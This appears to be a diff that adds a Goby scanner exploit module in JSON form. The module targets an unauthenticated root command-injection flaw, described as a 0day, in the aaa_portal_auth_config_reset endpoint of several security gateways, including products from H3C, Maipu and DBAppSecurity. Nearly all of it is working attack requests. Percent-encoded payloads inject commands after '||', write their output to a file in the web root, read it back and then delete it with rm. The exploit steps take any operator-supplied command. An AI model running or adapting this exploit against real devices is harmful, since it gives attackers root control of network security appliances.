@@ -1,0 +1,204 @@
+{
+  "Name": "Multiple Security Gateway RCE aaa_portal_auth_config_reset",
+  "Description": "A RCE in multiple security gateway. Affected products include maipu--isg1000-security-gateway , h3c-firewall, dbappsecurity-sg and others.",
+  "Product": "Multiple Security Gateway",
+  "Homepage": "https://gobies.org/",
+  "DisclosureDate": "2021-06-07",
+  "Author": "mojie@gmail.com",
+  "GobyQuery": "header=\"Set-Cookie: USGSESSID\"",
+  "Level": "3",
+  "Impact": "<p>The attackers are allowed to execute any code with root privilege without any login crenditials.</p>",
+  "Recommandation": "<p>1. For security devices, it's not recommended to make them accessable from Internet.</p><p>2. You should contact the product suppliance for help.</p>",
+  "References": [
+    "It's a 0day exploit, therefore there is no reference."
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "id"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%65%63%68%6f%20%76%75%6c%6e%5f%63%68%65%63%6b%5f%32%33%33%33%33%33%33%20%3e%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/webui/images/basic/login/main_logo22.txt",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "vuln_check_2333333",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20%72%6d%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "set_variable": [
+          "cmdUrlEncoded|cmd|url_encode|{{{cmd}}}"
+        ],
+        "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20{{{cmdUrlEncoded}}}%20%3e%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": 200,
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/webui/images/basic/login/main_logo22.txt",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "aaa|lastbody"
+      ]
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20%72%6d%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|aaa"
+      ]
+    }
+  ],
+  "Tags": [
+    "RCE",
+    "0day"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
